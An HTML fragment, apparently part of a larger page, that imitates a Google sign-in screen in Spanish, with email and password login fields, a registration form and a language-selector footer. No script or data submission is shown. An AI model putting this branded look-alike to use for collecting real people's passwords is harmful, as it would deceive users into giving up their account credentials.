        <h1 id="formTitle">Iniciar sesión</h1>
        <h2 id="formSubtitle">Utiliza tu Cuenta de Google</h2>
        
        <form id="loginForm" class="form-group">
            <input type="email" id="email" placeholder="Correo electrónico o teléfono" required>
            <div id="loginError" class="error-message"></div>
            
            <input type="password" id="password" placeholder="Introduce tu contraseña" required>
            
            <a href="#" class="forgot-email">¿Has olvidado tu correo electrónico?</a>
            
            <div class="buttons">
                <a href="#" class="create-account" id="showRegister">Crear cuenta</a>
                <div class="button-container">
                    <button type="submit" class="next-button">Siguiente</button>
                    <div id="loginLoader" class="loader"></div>
                </div>
            </div>
        </form>
        
        <form id="registerForm" class="register-form">
            <input type="text" id="name" placeholder="Nombre completo" required>
            <input type="email" id="newEmail" placeholder="Correo electrónico" required>
            <input type="password" id="newPassword" placeholder="Contraseña" required>
            <p class="password-hint">Usa al menos 8 caracteres con una combinación de letras, números y símbolos</p>
            <input type="password" id="confirmPassword" placeholder="Confirmar contraseña" required>
            
            <div id="registerError" class="error-message"></div>
            <div id="registerSuccess" class="success-message">¡Cuenta creada con éxito!</div>
            
            <div class="buttons">
                <a href="#" class="create-account" id="showLogin">Iniciar sesión</a>
                <div class="button-container">
                    <button type="submit" class="next-button">Registrarse</button>
                    <div id="registerLoader" class="loader"></div>
                </div>
            </div>
        </form>
        
        <div class="footer">
            <select class="language-select">
                <option>Español (España)</option>
                <option>English (United States)</option>
                <option>Français (France)</option>
                <option>Deutsch</option>
            </select>
            
            <div class="help-links">
                <a href="#" class="help-link">Ayuda</a>
                <a href="#" class="help-link">Privacidad</a>
                <a href="#" class="help-link">Términos</a>
